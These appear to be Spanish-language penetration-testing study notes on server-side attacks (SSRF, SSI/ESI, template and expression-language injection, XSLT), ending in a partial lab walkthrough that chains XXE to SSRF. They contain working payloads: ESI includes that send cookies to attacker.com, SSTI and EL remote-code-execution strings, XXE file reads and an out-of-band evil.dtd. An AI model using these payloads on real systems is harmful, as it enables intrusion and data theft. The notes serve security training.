# Server side atack

* Falsificación de solicitudes del lado del servidor
* Inclusión del lado del servidor
* Evaluación lingüística
* Atacar motores XSLT

### Abusar de dispositivos intermedios <a href="#abusing-intermediate-devices" id="abusing-intermediate-devices"></a>

Cuando Tomcat se combina con un proxy inverso de Nginx, puede ocurrir una condición insegura; Esto se debe a que el propio Tomcat tratará .**.; /** como si se tratara de una secuencia de recorrido del directorio padre .**. /** y normalizar (desinfectar) esa secuencia.

* Sin embargo, cuando se confía en el proxy inverso para esta tarea, es posible que el proxy no lo haga, lo que permite que se escape de **un directorio** porque pasarán esa ruta a Tomcat sin cambios, y Tomcat no realizará una validación adicional, ya que se basa en el proxy inverso para hacerlo.

Ejemplo:

```
http://tomcatapplication.com/..;/manager/html 

# might reveal the Tomcat Manager
```

Otra oportunidad para acceder al administrador oculto de Tomcat es _AJP Proxy_.

* Por lo general, se ejecuta en el puerto 8009 y se acompaña de sitios web basados en Tomcat.
* AJP13 no es una aplicación web, es un protocolo binario
* Sin embargo, el proxy ajp puede ser una puerta de entrada a recursos internos (paneles administrativos o sitios web no publicados)

Para conectarse a un puerto ajp remoto, debe tener Apache instalado en su sistema

```
apt-get install apache2
```

A continuación, debe instalar el módulo relacionado con ajp:

```
apt install libapache2-mod-jk
```

Y habilítelo:

```
a2enmod proxy_ajp
```

Cree una ruta de archivo en la ruta: /etc/apache2/sites-enabled/ajp.conf

![[Pasted image 20240311155527.png]]

A continuación, reinicie apache. Debería poder visitar el sitio web remoto en http://127.0.0.1.

> Dado que el servidor de aplicaciones web real está oculto en lo más profundo de su infraestructura, la capacidad de conocer su dirección IP real puede ser un vuln en sí mismo.

> Podría ser incluso mejor si uno es capaz de emitir una solicitud en nombre de ese servidor o, en el caso más complejo, recuperar los resultados de dichas solicitudes

### Ataque SSRF <a href="#ssrf-attack" id="ssrf-attack"></a>

La falsificación de solicitudes del lado del servidor es un ataque en el que el usuario puede hacer que el servidor de aplicaciones (o un proxy u otra parte de su infraestructura) emita una solicitud de recursos externos

La explotación de la SSRF puede dar lugar a:

```
- Sensitive Information Disclosure
- Stealing authentication information (Windows NTLM hashes)
- File read/inclusion
- Remote Code Execution
```

Los lugares más obvios para buscar:

```
- in Load profile picture from URL functionalities 
- or similar features
```

La forma más segura de obtener un archivo remoto por parte del sitio web de destino sería hacerlo utilizando javascript del lado del cliente. En tal caso, la solicitud es realizada por el equipo del usuario y ninguna infraestructura de aplicaciones participa en la solicitud de los recursos remotos.

#### Cuando SSRF es una característica <a href="#when-ssrf-is-a-feature" id="when-ssrf-is-a-feature"></a>

El ataque SSRF se puede llevar a cabo no solo contra las utilidades de **importación de imágenes**, sino también contra cualquier mecanismo que dependa de la obtención de recursos remotos. En las aplicaciones web, normalmente puede ser:

```
- API specification imports (WSDL imports)
- Other file imports
- Connection to remote server (FTP)
- **ping** or **alivecheck** utilities
- Any parts of an http request that includes URLs
```

#### Explotación ciega de la SSRF <a href="#blind-ssrf-exploitation" id="blind-ssrf-exploitation"></a>

Ejemplo: generadores de documentos

Si uno es capaz de inyectar contenido en un generador de PDF en línea, insertar algo como el código a continuación probablemente podría llevar a recibir una solicitud GET del servidor analizador. Esto se debe a que el analizador de contenido del lado del servidor intentará evaluar el contenido antes de procesar el PDF

```
<img src=http://attacker.com:80/ssrf>
```

* A continuación, analizará la etiqueta IMG e intentará obtener la imagen remota sin saber que no existe
* Las cargas útiles SSRF se pueden insertar en los encabezados de solicitud HTTP. Puedes, por ejemplo, colocar tu dominio en cualquier encabezado HTTP y buscar la resolución HTTP o DNS

> en BURP intruder puedes alimentarlo con una lista de todos los encabezados HTTP y asignar tu dominio a cada uno de ellos. Es posible que algunos de los proxies intermedios intenten resolver estos dominios.

**Estructura de la URL**

https://chromium.googlesource.com/chromium/src/+/master/docs/security/url\_display\_guidelines/url\_display\_guidelines.md

```
https://user:pass@sub.example.com:8080/path?query#fragment
```

**Ejemplo de SSRF**

https://github.com/ethicalhack3r/DVWA

Usaremos el módulo de inclusión de archivos, que es similar a las funcionalidades de recuperación de **archivos de** una aplicación web. DVWA tiene que ejecutarse en modo **de baja** seguridad.

* Queremos proxy de nuestros requets a través de BURP

Instalar socat

```
apt install socat
```

A continuación, la DVWA se expone a través del reenvío de puertos mediante socat, el puerto externo 800 se conectará al interno 80. Esto expondrá su aplicación vuln al mundo exterior

Adelante:

```
sudo socat tcp-listen:800,fork tcp:127.0.0.1:80

# Now its exposed 
```

Podemos intentar iniciar un oyente en netcat y obtener su dirección a través de una solicitud GET

```
GET /DVWA/vulnerabilities/f?page=http://test:pwd@127.0.0.1:21/a HTTP/1.1
```

#### Forzar la autenticación <a href="#forcing-authentication" id="forcing-authentication"></a>

```
nv -lvnp 21

# the back-end used the username:password combination as a Basic Authentication header! 
# This means, when issuing an arbitrary request, we can also do it to like basic authentication protected resources
```

#### Cambio de protocolo <a href="#changing-protocol" id="changing-protocol"></a>

DVWA también acepta un esquema de URL https e intenta establecer una conexión cifrada:

```
GET /DVWA/vulnerabilities/f?page=https://test:pwd@127.0.0.1:21/ssl HTTP/1.1
```

Dado que estamos usando una conexión de texto plano netcat, solo vemos el intento de establecer SSL a nuestro oyente

También se acepta el esquema 'file://', lo que resulta en la inclusión de archivos.

```
GET /DVWA/vulnerabilities/f?file=http:///etc/passwd HTTP/1.1
```

Siempre puede probar más controladores de protocolos

https://www.php.net/manual/en/wrappers.php

```
- file:// # accessing local filesystem
- http:// # accessing HTTP(s) URLs
- ftp://  # accessing FTP(s) URLs
- php://  # accessing various I/O streams
- zlib:// # compression streams
- data:// # data (RFC 2397)
- glob:// # find pathnames matching patterns
- phar:// # php archive
- ssh2:// # secure shell 2
- rar://  # rar
- ogg://  # audio streams
- expect:// # process interaction streams
```

#### Atacar SSRF en Windows <a href="#attacking-ssrf-on-windows" id="attacking-ssrf-on-windows"></a>

Puede intentar acceder a una ruta UNC en el siguiente formato:

```
file:///\\attackerdomain\sharename
```

* https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-dtyp/62e862f4-2a51-452e-8eeb-dc4ff5ee33cc

Si el servidor intenta autenticarse en un recurso compartido falso, es posible que pueda robar su hash de contraseña NTLM. El hash puede estar sujeto a más descifrado fuera de línea.

Los intentos de autenticación SMB se pueden capturar (por ejemplo, utilizando el módulo metasploit)

```
auxiliary/server/capture/smb
```

#### Otros escenarios de la SSRF <a href="#other-ssrf-scenarios" id="other-ssrf-scenarios"></a>

A veces, será posible obtener un archivo HTML remoto.

Por lo tanto, SSRF conducirá a XSS reflejado:

```
cat xss.html
# <script>alert(document.domain)</script>
```

> Al visitar la URL, el servidor incluye el archivo HTML remoto

#### SSRF basada en el tiempo <a href="#time-based-ssrf" id="time-based-ssrf"></a>

Se utiliza especialmente en escenarios de explotación ciega

* En función de las diferencias en el tiempo de respuesta, es posible que se pueda realizar un escaneo de puertos internos o un descubrimiento interno de redes/dominios

#### Extensión de la SSRF <a href="#extending-ssrf" id="extending-ssrf"></a>

¿Qué podemos conseguir?

```
- RCE (best scenario)
- File inclusion
- Reading sensitive data
- Interact with internal services
# Even executing only GET requests, 
# its enough to execute critical actions on internal services and execute arbritrary code.
```

### Inclusión del lado del servidor <a href="#server-side-include" id="server-side-include"></a>

Es una tecnología de servidor web de lenguaje neutro que admite la creación de contenido dinámico antes de renderizar la página.

* Cuando la aplicación web hace uso de páginas .**shtml**, .**shtm** o **.stm**

La mejor opción es insertar etiquetas SSI de ejemplo en la aplicación web y observar el lugar donde se representan.

> puede agregar ejemplos de cargas útiles SSI en la lista de intrusos BURP

#### Expresiones SSI <a href="#ssi-expressions" id="ssi-expressions"></a>

Ejemplo:

```
<!--#directive param="value"-- >
```

Puede intentar ejecutar comandos para imprimir variables del lado del servidor:

```
<!--#echo var="DOCUMENT NAME"-- >
<!--#echo var="DATE LOCAL"-- >
<!--#include virtual="/index.html"-- >
<!--#exec cmd="dir"-- >
<!--#exec cmd="ls"-- >
```

#### Práctica de SSI <a href="#ssi-practice" id="ssi-practice"></a>

Puedes practicar aquí:

```
https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project
```

### Incluye el lado del borde (ESI) <a href="#edge-side-includes-esi" id="edge-side-includes-esi"></a>

Los proxies y otras infraestructuras intermedias similares los utilizan

* Las aplicaciones web modernas suelen constar de varios servidores intermedios antes de que las solicitudes de los usuarios lleguen al servidor de aplicaciones final. Deberíamos intentar interactuar con dicha infraestructura intermedia inyectando algunas etiquetas ESI a nuestras solicitudes
* ESI tiene una forma de etiquetas XML, que se agregan dinámicamente al contenido estático almacenado en caché para enriquecerlo con algunas características dinámicas.
* Las etiquetas ESI se inyectan mediante mecanismos de caché para otros mecanismos de caché; Sin embargo, si un usuario puede agregar etiquetas ESI a la solicitud HTTP, los proxies podrían analizarla sin conocer su origen.

![[Pasted image 20240311155557.png]]

#### Expresiones ESI <a href="#esi-expressions" id="esi-expressions"></a>

Ejemplo:

```
<esi:include src="/weather/name?id=$(QUERY_STRING{city_id})"/>
```

#### Detección de ESI <a href="#esi-detection" id="esi-detection"></a>

En la mayoría de los casos, el uso de un enfoque de ataque ciego

Si ves el encabezado:

```
Surrogate-Control: content="ESI/1.0"
# in this case, u can suspect that ESI is in use. 
# However, in most cases, there will be no sign of using ESI
```

Para detectar con el enfoque ciego, el usuario puede intentar inyectar etiquetas que hagan que los proxies resuelvan direcciones arbitrarias que resulten en SSRF:

```
<esi:include src=http://attacker.com/>
```

#### Explotación de ESI <a href="#esi-exploitation" id="esi-exploitation"></a>

Es posible incluir un archivo HTML que resulte en XSS:

```
<esi:include src=http://attacker.com/xss.html>
```

El xss.html puede contener código similar:

```
<script>alert(1)</script>
```

Exfiltre las cookies directamente haciendo referencia a una variable especial:

```
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
# which can bypass the httpOnly flag in case of its presence
```

Existe la posibilidad de RCE cuando la aplicación es compatible con XSLT

* XLST es un lenguaje dinámico que se utiliza para transformar archivos XML de acuerdo con un patrón específico

La carga útil para la inyección de ESI a la ejecución XSLT:

```
<esi:include src="http://attacker.com/file.xml" dca="xslt" stylesheet="http://attacker.com/transformation.xsl" />
```

Además:

```
- https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection
- https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations
```

### Evaluación lingüística <a href="#language-evaluation" id="language-evaluation"></a>

Incluye:

```
- Double evaluation
- Server-side Template Injections
- Expression language injections
```

> Todo ello debido a la capacidad de los usuarios para forzar al servidor de aplicaciones de destino a ejecutar código programático arbritrary. Este código siempre tiene la forma de una expresión

#### Motores de plantillas <a href="#template-engines" id="template-engines"></a>

De forma similar al SSI, algunas aplicaciones web usan sistemas de plantillas para permitir la generación de contenido dinámico en sus páginas:

```
$template->render("Hello ${user_name}!")
```

> La expresión **${}** = la expresión de plantilla

que contiene la variable _user\_name_. No sabemos el origen de la user\_name;

Presumiblemente, se genera en el lado del servidor (durante el inicio de sesión). Usando el motor de plantillas, es posible imprimir dinámicamente ese nombre de usuario en la página de inicio de sesión

```
$template->render("Hello $_GET['user_name']!")
# in this case, the user could be able to inject the template expression independently. 
# We now control what will be evaluated and most likely, user_name is the last thing of interest.
```

Lenguajes más populares que usan plantillas en el desarrollo web:

```
- PHP (Twig, Smarty)
- Python (Flask, Jinja)
- Java (Freemarker)
```

En las aplicaciones Java, algunas tecnologías tienen un propósito similar de generar contenido dinámico:

```
- OGNL (Object-Graph Navigation Language) - frequently used in Apache Struts RCE exploits
- EL (Expression Language) - generic dynamic expression set For Java applications
```

#### Detección de la inyección de plantillas <a href="#detecting-template-injection" id="detecting-template-injection"></a>

Difícil de encontrar y explotar

* Podemos inyectar varias etiquetas de plantilla en la aplicación web y observar si se transformaron de alguna manera en la respuesta
* Tenga en cuenta que, a menudo, los datos inyectados pueden reflejarse indirectamente, por ejemplo, en una página diferente a la que se insertaron (por ejemplo, los nombres de inicio de sesión no válidos pueden reflejarse en los registros accesibles solo para administradores)

La mayoría de las expresiones de plantilla son similares entre sí; Todos están entre llaves como los siguientes ejemplos:

```
{ {expr} }
${expr}
%{expr}
#{expr}
%25{expr}
{expr}
```

#### Confirmación de la inyección de plantilla <a href="#confirming-template-injection" id="confirming-template-injection"></a>

La mejor expresión para inyectar:

```
${5*11111}
# in this case, you would look For the value '55555' in the response of your request
```

> Se requiere una confirmación adicional para asegurarse de que el código se ejecuta en el lado del servidor y tiene acceso a datos confidenciales

Con Burp Suite PRO, debería obtener una extensión llamada **J2EE Scan** que agrega automáticamente pruebas para la inyección de lenguaje de expresión

Otra idea podría ser usar **Burp Intruder** para probar varias cargas útiles de ese tipo, ya que es probable que mientras,

Por ejemplo:

```
#{5*11111} # will work
%{5*11111} # may not
```

Puede usar el siguiente diagrama para ayudar a generar perfiles de este tipo de vuln, ya sea una plantilla o una inyección de lenguaje de expresión

![[Pasted image 20240311155620.png]]
#### Para identificar mejor la tecnología <a href="#to-better-identify-the-technology" id="to-better-identify-the-technology"></a>

El primer paso después de observar anomalías relacionadas con los cálculos o el manejo inusual de expresiones entre llaves debe ser tratar de identificar la tecnología subyacente

* Observe cuál es la tecnología genérica de la aplicación. Si es Java (u ver que se usa .jsp extensiones), entonces puede sospechar que es un lenguaje de expresión / OGNL
* Utilice el diagrama anterior, ya que contiene el comportamiento popular de los motores de plantillas al manejar expresiones
* Intente inyectar llaves sin cerrar (tenga cuidado, ya que existe la posibilidad de que deshabilite permanentemente la página web atacada); Esto podría provocar un error detallado al revelar la tecnología subyacente
* Observe otros errores detallados para los nombres de tecnología

#### Explotación de la inyección de plantillas <a href="#exploiting-template-injection" id="exploiting-template-injection"></a>

PHP Smarty:

```
# The RCE payload can be as simple as the one-liner:
{php}echo 'id';{/php}
```

Pitón Mako:

```
<%
  import os
  x=os.popen('id').read()
%>
${x}
```

Ramita PHP:

https://github.com/s4n7h0/xvwa

```
{ {5*5} } 
# results in "25"

{ {<svg/onload=confirm(1)>} }
# u can observe a XSS vuln
```

Twig usaba un objeto conocido llamado \*_\*_ = instancia de aplicación actual

* Uno de los atributos de \_self de ramitas se denomina **env** y contiene otros métodos a los que se puede llamar

→ https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php

Ejemplo _de función de visualización_:

```
{ { _self.env.display("xyz") } }
```

La ejecución de comandos a través de la función getFilter debe realizarse de la siguiente manera:

```
- Call registerUndefinedFilterCallback, which allows us to register any function as a filter callback
- The filter callback is then called by invoking _self.env.getFilter()
```

Ejemplo:

```
{ { _self.env.registerUndefinedFilterCallback("system") } } { {_self.env.getFilter("whoami") } }
```

Además:

```
- https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf
```

### Lenguaje de expresión / Inyección OGNL <a href="#expression-language--ognl-injection" id="expression-language--ognl-injection"></a>

Las aplicaciones Java son fácilmente reconocibles porque:

```
- Use common extensions like .jsp or .jsf
- Throw stack traces on errors
- Use known terms in headers like "Servlet"
```

Confirme la inyección con un resultado de cálculo:

```
${*5}
{5*5}
#{5*5}
%{5*5}
%25{5*5}
```

![[Pasted image 20240311155640.png]]

El código se guarda como Main.java

* Debe haber varios frascos para realizar la prueba correctamente

→ https://commons.apache.org/proper/commons-lang/download\_lang.cgi

→ https://www.javadoc.io/doc/org.springframework/spring-core/latest/index.html

→ https://www.javadoc.io/doc/org.springframework/spring-expression/latest/index.html

> Asegúrese de que JDK funciona

* Intente ejecutar **javac** y **java -version**

De otra manera:

```
apt install update and install default-jdk
```

Compilar las bibliotecas jar

```
javac -cp commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:.Main.java
```

Ahora podemos usar el comando java, simplemente cambie el javac a java y elimine la extensión .java al final del nombre del programa

```
java -cp commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:.Main
```

Introduzca una cadena para evaluar:

```
{5*5}
[25]
```

#### Hablando con EL Parse <a href="#talking-to-el-parser" id="talking-to-el-parser"></a>

A medida que se configura el entorno, puede comenzar a probar las expresiones:

```
{"aaaa".toString()}
[aaaa]
{"bbb".replace("b","x")}
[xxx]
```

#### Jugar con las clases <a href="#playing-with-classes" id="playing-with-classes"></a>

En situaciones en las que no podemos escribir código plano:

```
{"x".getClass()}
[class java.lang.String]

{"".getClass().forName("java.util.Date")}
[class java.util.Date]
```

Enumate los métodos de los objetos:

```
{"".getClass().forName("java.util.Date").getMethods()[0].toString()}
[public boolean java.util.Date.before(java.util.Date)]
```

> El primer método accesible de java.util = **before()**

* https://www.javatpoint.com/java-date-before-method
* El paquete de datos tiene un método before() que toma un objeto Date como argumento

#### Ejecución de código EL <a href="#el-code-execution" id="el-code-execution"></a>

Probando RCE:

```
Java.lang.Runtime.getRuntime().exec(command)
java.lang.ProcessBuilder(command, argument1, argument2).start()
```

getRuntime intenta:

```
{"".getClass().forName("java.lang.Runtime").getMethods()[6].toString()}
[public static java.lang.Runtime java.lang.Runtime.getRuntime()]
```

Invoque la función final:

```
{"".getClass().forName("java.lang.Runtime").getRuntime().exec("id")}
[Process[pid=2770, exitValue=0]]
```

En tal escenario, preferiríamos optar por un shell inverso interactivo. En este caso, confirmamos la existencia de la ejecución de código mediante la emisión de curl, de la siguiente manera:

```
{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://127.0.0.1/rce")}
[Process[pid=2816, exitValue="not exited"]]
```

La solicitud se recibe en un agente de escucha de netcat:

```
nc -lvnp 80
```

Curl es muy útil, podemos transferir archivos desde y hacia la máquina víctima

> Así que podemos mover un shell inverso y ejecutarlo usando la inyección de plantilla RCE vuln

#### Ampliación de la explotación de EL <a href="#extending-el-exploitation" id="extending-el-exploitation"></a>

Las variables de servidor suelen tener nombres universales, como :

```
- ${application} 
- ${session}
- ${request}
```

> El intruso de eructo se puede utilizar para inyectarlos y buscar si no se devuelven datos interesantes en el resultado (si el objeto se resuelve)

Algunos nombres de variables pueden tener el siguiente aspecto (se ejecutan en sus respectivas llaves de plantilla):

```
applicationScope # global application variables
requestScope # request variables
initParam # application initialization variables
sessionScope # session variables
param.X # parameter value where X is name of a http parameter
```

Podemos recuperar con .toString así:

```
${sessionScope.toString()}
```

La omisión de autorización de ejemplo puede ser similar a la siguiente instrucción:

```
${pageContext.request.getSession().setAttribute("admin",true)}
```

Con burp intruder podemos encontrar variables con listas de palabras (como la siguiente):

```
${user}
${password}
${employee.FirstName}
```

Además:

```
- https://techblog.mediaservice.net/2016/10/exploiting-ognl-injection/
- https://sethjackson.github.io/2018/04/16/el-injection/
- https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts/
```

vamos a compilar y explotar un ejemplo simple de la inyección de Spring Expression Language

### Propósito de XSLT <a href="#xslt-purpose" id="xslt-purpose"></a>

eXtensible Stylesheet Language Transformations es un lenguaje utilizado en las transformaciones de documentos XML

> también conocido como XSL

El resultado de la transformación puede ser cualquier cosa, pero a menudo es otro archivo de tipo xml o html.

* XSL utiliza sus funciones integradas y el lenguaje XPATH para seleccionar y cambiar partes de un documento XML

#### Ejemplo de XSLT <a href="#xslt-example" id="xslt-example"></a>

![[Pasted image 20240311155707.png]]
```
<xsl:template-match="/"> is a directive that means that this stylesheet should apply to any ("/") xml nodes
# For any XML structure ("/"), the output will look like the red code.
```

![[Pasted image 20240311155730.png]]

También puede ver otras directivas XSL. Esos dos usan XPATH, que es un lenguaje utilizado para recorrer documentos XML y encontrar ciertos valores. En este caso, usamos el valor de (partiendo del nodo raíz):

```
Catalog
  cd
    title
```

![[Pasted image 20240311155753.png]]

Al final, recibimos una tabla HTML que contiene los valores del **título del nodo**. Se duplica a propósito. Por supuesto, cualquier otro elemento se puede importar a la tabla de resultados.

#### Experimentación con el analizador XSLT <a href="#experimenting-with-xslt-parser" id="experimenting-with-xslt-parser"></a>

Algunos motores XSLT conocidos:

```
- Saxon
- Xalan
```

```
apt install default-jdk
apt install libsaxonb-java
```

#### Documentación XSLT <a href="#xslt-documentation" id="xslt-documentation"></a>

```
- https://www.w3.org/TR/xslt-10/
- https://www.w3.org/TR/xslt20/
- https://www.w3.org/TR/xslt-30/
```

#### Lectura de archivos XSLT <a href="#xslt-file-read" id="xslt-file-read"></a>

Si controlamos el archivo XSL:

```
unparsed-text($href as xs:string?) as xs:string?
unparser-text($href as xs:string?, $encoding as xs:string) as xs:string?

# the 'unparsed-text' function reads an external resource 
# (For example: a file) and returns its contents as a string
```

Ejemplo:

```
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
# the result contains a /etc/passwd file
```

![[Pasted image 20240311155812.png]]

XSL:Include es otra función interesante, que nos permite unir otra hoja de estilo xsl. La desventaja es que tiene que ser un documento XSL válido. Ventaja: La SSRF todavía es posible.

#### XSLT SSRF <a href="#xslt-ssrf" id="xslt-ssrf"></a>

```
<xsl:include href="http://127.0.0.1:8080/xslt"/>
```

El agente de escucha de netcat recibe la solicitud. Podemos reconocer la versión java de la víctima en el encabezado User-agent.

```
nc -lvnp 8080
```

#### Extensión de los ataques XSLT <a href="#extending-xslt-attacks" id="extending-xslt-attacks"></a>

En el mundo real, es difícil. Pero, de nuevo, la documentación puede ayudarte a identificar un vuln grave. Además, los analizadores XSLT pueden ser vulnerables a XXE vulns de la misma manera que todos los demás analizadores XML.

> Al responder a las **directivas XSL:INCLUDE**, u también puede intentar responder con XML que contenga una carga útil XXE.

> Además, es posible que los motores XSLT puedan ejecutar código personalizado, lo que da como resultado RCE

la segunda entrada es el código XSLT

Se define la transformación

En este caso, usamos el valor de (comenzando desde el nodo raíz)

Ejemplo de texto sin analizar

### Laboratorio 1 - SSRF a RCE <a href="#lab-1---ssrf-to-rce" id="lab-1---ssrf-to-rce"></a>

Solución

Paso 1: Abra el enlace del laboratorio para acceder a la instancia de la GUI de Kali.

...

Paso 2: Compruebe si se puede acceder a la máquina/dominio proporcionado.

Mandar:

```
ping -c3 demo.ine.local
```

> Se puede acceder a la máquina suministrada.

Paso 3: Verifique los puertos abiertos en la máquina proporcionada.

Mandar:

```
nmap -sS -sV demo.ine.local
```

Los puertos 22 (SSH), 5000 y 8000 (servidor HTTP basado en Python) están abiertos en el equipo de destino. Como se menciona en la descripción del desafío, la aplicación web vulnerable está disponible en el puerto 5000.

Además, si comprueba la salida de Nmap, encontrará la huella digital del servicio que se ejecuta en el puerto 5000. Contiene la respuesta HTTP.

Paso 4: Compruebe la aplicación web disponible en el puerto 5000.

Abra la siguiente URL en el navegador:

```
URL: http://demo.ine.local:5000
```

Una aplicación XML Validator está disponible en el puerto 5000.

Envíe el siguiente fragmento XML para su validación:

```
<?xml version="1.0" encoding="UTF-8"?>
<parent>
  <child>
    <name>Test Name</name>
    <description>Test Description</description>
  </child>
</parent>
```

Haga clic en el botón Validar XML:

* La respuesta indica que el XML proporcionado es válido.

> Tenga en cuenta que el XML proporcionado también se refleja en la respuesta.

Paso 5: Identifique y explote la vulnerabilidad XXE.

Envíe el siguiente fragmento XML que contenga una entidad XML:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY desc "Test Description"> ]>
<parent>
  <child>
    <name>Test Name</name>
    <description>&desc;</description>
  </child>
</parent>
```

> Observe que la respuesta contiene la descripción especificada en la entidad XML.

> Tenga en cuenta que sabemos que existe una vulnerabilidad XXE; Aprovechémoslo para extraer información sobre los servicios internos que se ejecutan en la máquina de destino.

Utilice el siguiente fragmento XML para leer el contenido del archivo /proc/net/tcp:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///proc/net/tcp">
]>

<data>&file;</data>
```

Información: El archivo /proc/net/tcp contiene información sobre las conexiones de red TCP actuales.

> ¡Fíjate que hemos recuperado el contenido del archivo!

Contenido del archivo /proc/net/tcp:

```
sl local_address rem_address st tx_queue rx_queue tr tm->when retrnsmt uid timeout inode
0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74435656 1 0000000000000000 100 0 0 10 0
1: 0100007F:22B8 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74418007 1 0000000000000000 100 0 0 10 0
2: 0B00007F:9599 00000000:0000 0A 00000000:00000000 00:00000000 00000000 65534 0 74430920 1 0000000000000000 100 0 0 10 0
3: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74434697 1 0000000000000000 100 0 0 10 0
4: 034CDCC0:1F40 024CDCC0:EB4C 06 00000000:00000000 03:0000176F 00000000 0 0 0 3 0000000000000000
5: 034CDCC0:1F40 024CDCC0:EB4E 01 00000000:00000000 00:00000000 00000000 0 0 74434828 1 0000000000000000 20 4 30 10 -1
```

> \[Nota] La información que recibió difiere ligeramente, ya que las direcciones IP de las máquinas cambian en cada inicio de laboratorio. Por favor, asegúrese de obtener el contenido del archivo anterior antes de continuar.

Paso 6: Decodifique las direcciones IP y los números de puerto recuperados del archivo /proc/net/tcp.

Utilice la siguiente secuencia de comandos de Python para convertir las direcciones IP en notación hexadecimal a decimal con puntos:

convert.py:

```
import socket
import struct
hex_ip = input("Enter IP (in hex): ")
addr_long = int(hex_ip, 16)
print("IP in dotted-decimal notation:", socket.inet_ntoa(struct.pack("<L", addr_long)))
```

Convierta las direcciones IP hexadecimales recibidas del archivo /proc/net/tcp:

Mandar:

```
python3 convert.py 
```

Una vez convertidas todas las direcciones IP, busque las direcciones IP internas. En este caso, es 127.0.0.1 y 127.0.0.11

Vamos también a convertir los puertos del sistema hexadecimal al decimal:

Comandos:

```
python3
0x0016
0x22B8
0x9599
0x1F40
```

> Los puertos correspondientes a las IP internas son 8000 y 38297, respectivamente.

Paso 7: Realizar un ataque SSRF para interactuar con los servicios internos.

Compruebe la dirección IP de la máquina atacante:

Mandar:

```
ip addr
```

La dirección IP de la máquina atacante es 192.220.76.2

> \[Nota] La dirección IP de las máquinas está destinada a cambiar con cada inicio de laboratorio. Asegúrese de obtener la dirección IP correcta antes de continuar con los siguientes pasos. De lo contrario, fracasarían los intentos de explotación.

Enviaremos el siguiente fragmento XML a la aplicación web vulnerable:

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://192.220.76.2:8080/evil.dtd">
  %dtd;
  %all;
]>
<data>&fileContents;</data>
```

> \[Nota] Por favor, asegúrese de reemplazar la dirección IP en la carga útil anterior.

Antes de enviar la carga útil XXE anterior, guarde el siguiente fragmento como evil.dtd:

```
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://localhost:8888">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```

Inicie un servidor HTTP basado en Python en el puerto 8080:

Mandar:

```
python3 -m http.server 8080
```

Información sobre la carga útil:

La primera carga útil (enviada a la aplicación web para su validación) cargaría el contenido del archivo evil.dtd desde la máquina atacante y, a continuación, el backend analizaría este archivo.

El archivo evil.dtd contiene la entidad que envía una solicitud a localhost:8888 y el resultado está incrustado en la sección CDATA.

Información sobre CDATA:

```
CDATA sections can be used to "block escape" literal text when replacing 
prohibited characters with entity references is undesirable.
```

* Referencia: https://www.w3resource.com/xml/CDATA-sections.php

Algunos ejemplos de caracteres prohibidos son:

```
<
,
>
,
&
,
"
,
'
.

```

Por lo tanto, la carga útil anterior se asegura de que si la respuesta contiene algunos caracteres restringidos, esos caracteres se incrustarán en la sección CDATA y, por lo tanto, el validador XML no generará errores.

Ahora estamos listos para enviar la carga útil XXE:

Observe que la respuesta contiene una lista de directorios. Debe ser algún tipo de servidor HTTP.

> La respuesta indica la presencia de archivos como flag1 y directorios como .ssh.

Regrese a la terminal que ejecuta el servidor HTTP basado en Python:

* Observe que hubo una solicitud de la máquina de destino para obtener el archivo evil.dtd.
* Guarde el contenido HTML recibido del servidor HTTP interno:

Mandar:

```
cat listing.html
```

Abra el archivo listing.html en el navegador:

URL:

```
file:///root/listing.html
```

Tenga en cuenta que hay 2 entradas: .**ssh/** y **flag1**.

Vamos a buscarlos en los pasos siguientes.

> \[Nota] El otro puerto interno abierto en la máquina no devolverá ninguna información. Se le anima a interactuar con él modificando el evil.dtd para contener la IP y el puerto en el que se ejecuta ese servicio.

Paso 8: Recupere la primera bandera a través de XXE.

Modifique el archivo evil.dtd para obtener el contenido del archivo flag1:

```
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://localhost:8888/flag1">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```

Inicie un servidor HTTP basado en Python en el puerto 8080:

Mandar:

```
python3 -m http.server 8080
```

Envíe la misma carga útil XXE que enviamos en el último paso:

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://192.220.76.2:8080/evil.dtd">
  %dtd;
  %all;
]>
<data>&fileContents;</data>
```

Se recupera el contenido del archivo flag1:

```
Flag 1: 5f1210be00b4b8dfecba7b56181d905c
```

Regrese a la terminal que ejecuta el servidor HTTP basado en Python:

Observe que hubo una solicitud de la máquina de destino para obtener el archivo evil.dtd.

Paso 9: Busca el contenido del directorio .ssh.

Modifique el archivo evil.dtd para obtener el contenido del directorio .ssh:

```
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://localhost:8888/.ssh/">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```

Inicie un servidor HTTP basado en Python en el puerto 8080:

Mandar:

```
python3 -m http.server 8080
```

